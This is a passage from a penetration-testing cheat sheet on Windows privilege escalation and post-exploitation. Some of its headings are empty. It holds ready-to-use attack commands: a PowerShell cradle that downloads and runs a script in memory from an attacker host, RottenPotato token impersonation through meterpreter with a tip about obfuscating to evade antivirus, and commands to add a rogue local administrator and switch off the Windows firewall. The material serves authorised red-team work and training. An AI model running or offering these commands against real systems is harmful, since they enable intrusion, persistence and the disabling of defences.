| **Process** | tasklist | get-process<br/>Get-CimInstance Win32_Process &#124; select ProcessName, ProcessId &#124; fl *<br/>Get-CimInstance Win32_Process -Filter "name = 'PccNTMon.exe'" &#124; fl * | wmic process get CSName,Description,ExecutablePath,ProcessId |

###### Network

The following commands can be used to retrieve information about the network
interfaces and active connections of the host:

### Exploit

###### Physical access

###### File system exploration

###### Unpatched system

Compare patch level to public known exploits offclient:

** Windows Exploit Suggester **

The windows-exploit-suggester tool compares a targets patch levels against the
Microsoft vulnerability database in order to detect potential missing patches
on the target.  
It also notifies the user if there are public exploits and Metasploit modules
available for the missing bulletins.  
It requires the 'systeminfo' command output from a Windows host in order to
compare that the Microsoft security bulletin database and determine the patch
level of the host.  
It has the ability to automatically download the security bulletin database
from Microsoft with the --update flag, and saves it as an Excel spreadsheet.

```
# python windows-exploit-suggester.py --update

python /opt/priv_esc/windows/windows-exploit-suggester.py --database <XLS> --systeminfo <SYSTEMINFO>
```

If the 'systeminfo' command reveals 'File 1' as the output for the hotfixes,
try executing 'wmic qfe list full' and feed that as input with the --hotfixes
flag, along with the 'systeminfo':

```
python windows-exploit-suggester.py --database <XLS> --systeminfo <SYSTEMINFO> --hotfixes <HOTFIXES>
```

**Sherlock**

PowerShell script to find missing software patches for critical vulnerabilities
that could be leveraged for local privilege escalation.

To download and execute directly into memory:

```
# CMD
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<Port>/Sherlock.ps1')"; Find-AllVulns

# PowerShell
IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<Port>/Sherlock.ps1'); Find-AllVulns
```

** Metasploit - Local Exploit Suggester **

The Local Exploit Suggester module suggests local meterpreter exploits that can
 be used against the target, based on the architecture and platform as well as
 the available exploits in meterpreter.

 ```
meterpreter > run post/multi/recon/local_exploit_suggester

# OR

msf > use post/multi/recon/local_exploit_suggester
msf post(local_exploit_suggester) > set SESSION <session-id>
msf post(local_exploit_suggester) > run
```

###### System misconfigurations exploits

###### Services

**Unquoted services path**

When a service path is unquoted, the Service Manager will try to find the service binary in the shortest path, moving up to the longest path until one works.   
For example, in the case of the path C:\Service Folder\Service.exe, the space is treated as an optional path to explore for that service. The resolution process will first look into C:\Service for the Service.exe binary and, if it exist, use to start the service.  
In summary, a service is vulnerable if the path to the executable has a space in the filename and the file name is not wrapped in quote marks; exploitation requires write permissions to the path before the quote mark. If a service is vulnerable, it can be leveraged to escalate privileges to the level of the account that starts the service.  

To find vulnerable services the PowerUp script and the  exploit/windows/local/trusted_service_path metasploit module can be used as well the following commands:

```bash
wmic service get name.pathname,startmode
wmic service get name.pathname,startmode | findstr /i /v """ | findstr /i /v "C:\\Windows\\"
```

**Writable services and services files**

**Restart a service**

###### Token Privileges abuse

Use the following command to retrieve the current user account token privileges:
```bash
whoami /priv
```
*Vulnerable tokens*

The following tokens can be exploited to gain SYSTEM access privileges:
- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

*Rotten Potato w/ Metasploit*

RottenPotato can be used in combination with the Metasploit meterpreter
incognito module to abuse the privileges above in order to elevate privilege to
SYSTEM.

Source: https://github.com/breenmachine/RottenPotatoNG

```bash
# Load the incognito module to toy with tokens
meterpreter > load incognito

# Upload the MSFRottenPotato binary on the target
# Some obfuscation may be needed in order to bypass AV
meterpreter > upload MSFRottenPotato.exe .

# The command may need to be run a few times
meterpreter > execute -f 'MSFRottenPotato.exe'
meterpreter > execute -f 'MSFRottenPotato.exe' -a '1 cmd.exe'

# The NT AUTHORITY\SYSTEM token should be available as a delegation token
# Even if the token is not displayed it might be available and the impersonation should be tried anyway
meterpreter > list_tokens -u
meterpreter > impersonate_token 'NT AUTHORITY\SYSTEM'
```

### Post-Exploit

###### Administrator to SYSTEM

The system account and the administrator account (Administrators group) have
the same file privileges, but they have different functions.  
The system account is used by the operating system and by services that run
under Windows. It is an internal account, does not show up in User Manager,
cannot be added to any groups, and cannot have user rights assigned to it.  
The system account is needed by tools that make us of Debug Privilege
(such as mimikatz) which allows someone to debug a process that they wouldnâ€™t
otherwise have access to.

The PsExec Microsoft signed tool can be used to elevate to system privilege from
an administrator account:

```
# -s   Run the remote process in the System account.
# -i   Run the program so that it interacts with the desktop of the specified session on the remote system
# -d   Don't wait for process to terminate (non-interactive).

psexec.exe -s -i -d cmd.exe
```

If a meterpreter is being used, the **getsystem** command can be leveraged to achieve the same end.

###### Add local Administrator

The net user commands can be used to create and add a windows account in the
administrator group:

```
# Create a new account
net user /add <USERNAME> <PASSWORD>

# Add account as administrator
net localgroup Administrators <USERNAME> /add
net localgroup Administrateurs <USERNAME> /add
```

###### Windows Firewall

To check whether the Windows Firewall is enabled on a server or computer,
the following command can be used as Administrator/SYSTEM:

```bash
netsh advfirewall show allprofiles
```

By default, three separate listings are present: Domain profile settings,
private profile settings and public profile settings.  
With the private profile, applied to a network adapter when it is connected
to a network that is identified by the user or administrator as a private network,
Windows enables network discovery features, allows file sharing and other
networked features.   
The public profile, applied to a network adapter by default or if specified so
by an user or administrator, is the most restrictive profile. In the default
public profile, Windows will block all inbound connections to programs that are
not on the list of allowed programs.   
Finally, the Domain profile is used when a server or computer is joined to an
Active Directory domain. In this environment, firewall settings are typically
(but not necessarily) controlled by a network administrator.

To disable the firewall use the following commands:

```bash
# Disable current profile
netsh advfirewall set currentprofile state off

# Disable all profiles
netsh advfirewall set allprofiles state off

# Disable the private, public and domain profiles
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set domainprofile state off
```

To open a specific port, or a range, use the following command:

```bash
netsh advfirewall firewall add rule name="<RULE_NAME" protocol=TCP dir=in localport=<PORT> action=allow
```
